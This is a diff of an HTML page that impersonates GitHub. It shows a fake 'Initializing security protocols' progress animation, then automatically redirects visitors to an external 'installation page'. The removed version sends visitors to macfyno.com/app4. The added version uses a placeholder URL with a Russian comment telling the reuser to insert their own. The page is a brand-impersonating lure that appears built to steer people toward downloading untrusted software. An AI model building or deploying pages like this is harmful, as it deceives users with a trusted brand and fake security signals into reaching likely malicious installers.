@@ -2,204 +2,290 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Preparing redirect…</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GitHub - Redirect</title>
 <style>
-  /* ===== GLOBAL ===== */
-  body {
+  * {
     margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
     background: #0d1117;
-    font-family: system-ui, sans-serif;
-    color: #c9d1d9;
-    text-align: center;
-    padding: 80px 20px;
+    color: #f0f6fc;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
   }
 
   .wrapper {
-    display: inline-block;
+    width: 100%;
+    max-width: 480px;
     text-align: center;
   }
 
-  h1 {
-    font-size: 2.5em;
-    margin-bottom: 10px;
+  .github-logo {
+    font-size: 32px;
+    font-weight: 700;
+    background: linear-gradient(90deg, #f0f6fc, #8b949e);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 12px;
   }
 
   .subtitle {
-    font-size: 1.2em;
-    margin-bottom: 40px;
     color: #8b949e;
+    font-size: 18px;
+    font-weight: 400;
+    margin-bottom: 40px;
   }
 
   .card {
     background: #161b22;
+    border: 1px solid #30363d;
     border-radius: 16px;
-    padding: 40px;
-    max-width: 480px;
-    margin: 0 auto 40px;
+    padding: 32px;
+    margin-bottom: 32px;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
   }
 
-  .progress {
+  .progress-header {
     display: flex;
     justify-content: space-between;
+    align-items: center;
+    margin-bottom: 16px;
+    font-size: 14px;
+    color: #c9d1d9;
+  }
+
+  .progress-percent {
+    font-weight: 600;
+    color: #2ea043;
     font-size: 16px;
   }
 
-  .bar {
+  .progress-bar {
+    height: 8px;
     background: #21262d;
-    height: 12px;
-    border-radius: 6px;
-    margin: 15px 0 30px;
+    border-radius: 8px;
     overflow: hidden;
+    margin-bottom: 28px;
+    position: relative;
   }
 
-  .bar-fill {
-    background: #2ea043;
-    width: 19%;
+  .progress-fill {
     height: 100%;
-    transition: width 0.5s;
+    width: 0%;
+    background: linear-gradient(90deg, #238636, #2ea043);
+    border-radius: 8px;
+    position: relative;
+    transition: width 0.3s ease-out;
+  }
+
+  .progress-fill::after {
+    content: '';
+    position: absolute;
+    top: 0;
+    right: 0;
+    width: 4px;
+    height: 100%;
+    background: rgba(255, 255, 255, 0.3);
+    border-radius: 0 8px 8px 0;
   }
 
   .status {
-    font-size: 16px;
-    margin-bottom: 30px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 24px;
+    font-size: 15px;
+    color: #f0f6fc;
   }
 
-  .dot {
-    display: inline-block;
-    width: 12px;
-    height: 12px;
+  .status-dot {
+    width: 10px;
+    height: 10px;
     background: #2ea043;
     border-radius: 50%;
-    margin-right: 8px;
-    animation: blink 1.2s infinite;
+    animation: pulse 1.5s infinite ease-in-out;
   }
 
-  @keyframes blink {
-    50% { opacity: 0.3; }
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
   }
 
-  .branch {
-    background: #238636;
-    border: none;
-    color: white;
-    padding: 10px 18px;
-    border-radius: 8px;
-    font-size: 16px;
-    cursor: pointer;
-    margin-bottom: 30px;
-  }
-
-  .grid {
-    display: grid;
-    grid-template-columns: repeat(10, 18px);
+  .branch-badge {
+    display: inline-flex;
+    align-items: center;
     gap: 8px;
-    justify-content: center;
+    background: rgba(35, 134, 54, 0.15);
+    border: 1px solid rgba(35, 134, 54, 0.3);
+    color: #2ea043;
+    padding: 10px 16px;
+    border-radius: 8px;
+    font-size: 14px;
+    font-weight: 500;
+    margin-bottom: 32px;
   }
 
-  .cell {
-    width: 18px;
-    height: 18px;
+  .branch-arrow {
+    font-size: 12px;
+    opacity: 0.8;
+  }
+
+  .grid-container {
+    display: grid;
+    grid-template-columns: repeat(10, 1fr);
+    gap: 8px;
+    margin-bottom: 8px;
+  }
+
+  .grid-cell {
+    aspect-ratio: 1;
     background: #21262d;
     border-radius: 4px;
+    transition: all 0.3s ease;
   }
 
-  .cell.active {
-    background: #2ea043;
+  .grid-cell.active {
+    background: linear-gradient(135deg, #238636, #2ea043);
+    box-shadow: 0 0 8px rgba(46, 160, 67, 0.4);
+    transform: scale(1.1);
   }
 
   .footer {
     color: #8b949e;
-    font-size: 1em;
+    font-size: 15px;
+    padding-top: 20px;
+    border-top: 1px solid #30363d;
+    margin-top: 24px;
   }
 </style>
 </head>
 <body>
+
 <div class="wrapper">
-  <h1>GitHub</h1>
+  <div class="github-logo">GitHub</div>
   <p class="subtitle">Preparing to redirect to external application</p>
 
   <div class="card">
-    <div class="progress">
+    <div class="progress-header">
       <span>Processing request</span>
-      <span id="percent">19%</span>
+      <span class="progress-percent" id="percent">0%</span>
     </div>
 
-    <div class="bar">
-      <div class="bar-fill" id="bar"></div>
+    <div class="progress-bar">
+      <div class="progress-fill" id="bar"></div>
     </div>
 
     <div class="status">
-      <span class="dot"></span>
-      Initializing security protocols
+      <div class="status-dot"></div>
+      <span>Initializing security protocols</span>
     </div>
 
-    <button class="branch">main → external-app</button>
+    <div class="branch-badge">
+      <span>main</span>
+      <span class="branch-arrow">→</span>
+      <span>external-app</span>
+    </div>
 
-    <div class="grid" id="grid"></div>
+    <div class="grid-container" id="grid"></div>
+
+    <p class="footer">You will be redirected to the installation page shortly</p>
   </div>
-
-  <p class="footer">You will be redirected shortly</p>
 </div>
 
 <script>
-  history.replaceState(null, "", location.href);
-
-  const grid = document.getElementById("grid");
-  const bar = document.getElementById("bar");
-  const percent = document.getElementById("percent");
-
-  // ===== GRID =====
+  // Инициализация сетки
+  const grid = document.getElementById('grid');
+  const bar = document.getElementById('bar');
+  const percent = document.getElementById('percent');
+  
+  // Создаем 70 ячеек (10x7)
   for (let i = 0; i < 70; i++) {
-    const cell = document.createElement("div");
-    cell.className = "cell";
+    const cell = document.createElement('div');
+    cell.className = 'grid-cell';
     grid.appendChild(cell);
   }
-
+  
+  // Анимация сетки
   setInterval(() => {
-    document.querySelectorAll(".cell").forEach(c => {
-      c.classList.toggle("active", Math.random() > 0.85);
+    const cells = document.querySelectorAll('.grid-cell');
+    cells.forEach(cell => {
+      if (Math.random() > 0.88) {
+        cell.classList.add('active');
+        setTimeout(() => {
+          cell.classList.remove('active');
+        }, 300);
+      }
     });
-  }, 500);
-
-  // ===== PROGRESS =====
-  let p = 19;
-
+  }, 400);
+  
+  // Прогресс бар с реалистичными фазами
+  let progress = 0;
+  let isHoldPhase = false;
+  let holdStartTime = null;
+  
   function animateProgress() {
-    let speed;
-
-    if (p < 10) {
-      speed = 0.25;
-    } else if (p < 55) {
-      speed = 0.9;
-    } else if (p < 80) {
-      speed = 0.18;
-    } else if (p < 92) {
-      speed = 1.4;
+    let speed = 0;
+    const now = Date.now();
+    
+    // Разные фазы загрузки
+    if (progress < 10) {
+      // Начало
+      speed = 0.2;
+    } else if (progress < 40) {
+      // Быстрая фаза
+      speed = 0.8;
+    } else if (progress < 60) {
+      // Фаза удержания (имитация процесса)
+      if (!isHoldPhase) {
+        isHoldPhase = true;
+        holdStartTime = now;
+      }
+      // Медленно растем во время удержания
+      const holdDuration = (now - holdStartTime) / 1000;
+      speed = 0.05 + Math.sin(holdDuration * 2) * 0.02;
+    } else if (progress < 90) {
+      // Ускорение после удержания
+      speed = 1.2;
+      isHoldPhase = false;
     } else {
-      speed = 0.35;
+      // Завершение
+      speed = 0.3;
     }
-
-    p += speed;
-
-    if (p >= 100) {
-      p = 100;
-      bar.style.width = "100%";
-      percent.textContent = "100%";
-
+    
+    progress += speed;
+    
+    if (progress >= 100) {
+      progress = 100;
+      bar.style.width = '100%';
+      percent.textContent = '100%';
+      
+      // Редирект через 500мс
       setTimeout(() => {
-        window.location.replace("https://macfyno.com/app4");
-      }, 400);
-
+        // Замените на ваш URL
+        window.location.href = 'https://example.com/installation';
+      }, 500);
       return;
     }
-
-    bar.style.width = p + "%";
-    percent.textContent = Math.floor(p) + "%";
-
+    
+    bar.style.width = progress + '%';
+    percent.textContent = Math.floor(progress) + '%';
+    
     requestAnimationFrame(animateProgress);
   }
-
-  requestAnimationFrame(animateProgress);
+  
+  // Запуск анимации
+  setTimeout(() => {
+    requestAnimationFrame(animateProgress);
+  }, 300);
 </script>
+
 </body>
 </html>
